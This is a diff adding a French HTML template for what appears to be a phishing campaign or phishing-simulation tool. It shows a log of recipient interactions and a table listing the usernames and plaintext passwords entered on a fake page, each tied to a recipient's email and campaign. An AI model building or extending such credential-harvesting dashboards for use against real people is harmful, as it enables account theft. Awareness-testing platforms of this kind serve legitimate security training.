@@ -1,0 +1,72 @@
+{% extends "base.html" %}
+{% block title %}Journal d'activité{% endblock %}
+{% block content %}
+  <h1>Journal d'activité</h1>
+  <section class="card">
+    <h2>Évènements enregistrés</h2>
+    {% if events %}
+      <div style="overflow-x:auto;">
+        <table class="table">
+          <thead>
+            <tr>
+              <th>Horodatage</th>
+              <th>Évènement</th>
+              <th>Destinataire</th>
+              <th>Campagne</th>
+              <th>Détails</th>
+              <th>Identifiant suivi</th>
+            </tr>
+          </thead>
+          <tbody>
+            {% for event in events %}
+              <tr>
+                <td>{{ event.timestamp|format_timestamp }}</td>
+                <td>{{ event.event }}</td>
+                <td>{{ event.email or '—' }}</td>
+                <td>{{ event.campaign or '—' }}</td>
+                <td>{{ event.details or '—' }}</td>
+                <td><code>{{ event.hash_id }}</code></td>
+              </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    {% else %}
+      <p class="muted">Aucune donnée enregistrée pour le moment. Lorsque les destinataires interagiront avec vos messages, les actions apparaîtront ici.</p>
+    {% endif %}
+  </section>
+
+  <section class="card" id="credentials" style="margin-top:2rem;">
+    <h2>Identifiants soumis</h2>
+    {% if credentials %}
+      <div style="overflow-x:auto;">
+        <table class="table">
+          <thead>
+            <tr>
+              <th>Horodatage</th>
+              <th>Destinataire</th>
+              <th>Campagne</th>
+              <th>Identifiant</th>
+              <th>Mot de passe</th>
+              <th>Identifiant suivi</th>
+            </tr>
+          </thead>
+          <tbody>
+            {% for cred in credentials %}
+              <tr>
+                <td>{{ cred.timestamp|format_timestamp }}</td>
+                <td>{{ cred.email or '—' }}</td>
+                <td>{{ cred.campaign or '—' }}</td>
+                <td>{{ cred.username or '—' }}</td>
+                <td>{{ cred.password or '—' }}</td>
+                <td><code>{{ cred.hash_id }}</code></td>
+              </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    {% else %}
+      <p class="muted">Aucun identifiant n'a encore été saisi sur la page factice.</p>
+    {% endif %}
+  </section>
+{% endblock %}
